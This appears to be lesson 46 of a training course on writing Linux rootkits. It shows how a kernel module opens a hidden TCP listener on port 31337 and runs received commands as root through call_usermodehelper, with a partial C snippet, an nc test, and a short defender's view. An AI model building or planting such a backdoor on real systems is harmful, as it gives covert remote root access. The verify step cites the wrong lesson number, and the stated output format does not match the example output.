# 46 - TCP backdoor

## What we are learning

A kernel-space TCP backdoor creates a listening socket from within the
module, accepts connections, receives commands, and executes them via
`call_usermodehelper`. This is how rootkits like KoviD provide remote
shell access without any userspace process.

Because the socket is created from kernel space, `ss -tlnp` may not
associate it with any visible process.

## The concept

```
  Module loads:
       |
       v
  sock_create(SOCK_STREAM)
  kernel_bind(:31337)
  kernel_listen()
       |
       v
  kthread loop:
       |
  kernel_accept() ----+
       |               |
       v               v
  kernel_recvmsg()   attacker connects
  "id\n"             via nc 127.0.0.1 31337
       |
       v
  call_usermodehelper("id")
       |
       v
  kernel_sendmsg() --> "uid=0(root)"
```

The socket belongs to the kernel. No userspace process owns it.
`ss -tlnp` may show the port, but with no PID attached.

## What we are doing

Create a kernel TCP listener on port 31337, accept connections in a
kthread, read newline-delimited commands, execute them, and send back
the output.

## Includes you need

```c
#include <linux/net.h>
#include <linux/in.h>
#include <linux/kthread.h>
#include <linux/umh.h>
#include <net/sock.h>
```

## Key code

Create and bind a listening socket:

```c
sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &listen_sock);
sock_set_reuseaddr(listen_sock->sk);
kernel_bind(listen_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
kernel_listen(listen_sock, 1);
```

Accept connections in a kthread loop. Use `kernel_recvmsg` to read
commands and `call_usermodehelper` to execute them.

## Output format

```
port=31337
commands=N
```

## Try it

```bash
./rootkitlings run
```

Inside the VM:

```sh
insmod hello.ko
cat /proc/rk_backdoor                 # port=31337, connected=0
dmesg | tail
rmmod hello
```

## Contract

The check script verifies:

- `/proc/rk_backdoor` contains `port=N` (a high port) and `commands=N`.
- Connecting via `nc` and sending a command executes it and returns output.
- `commands` starts at 0, incrementing for each command executed.
- `/proc/rk_backdoor` disappears after unload.

## Verify

```bash
./rootkitlings check 44
```

The check connects via `nc`, sends `id`, and verifies the output.

> **What a defender sees**: `/proc/net/tcp` shows the listening port.
> The kthread name appears in `ps`. `dmesg` logs connections.

See also: [45 - Covert channel](../45-covert-channel/README.md).
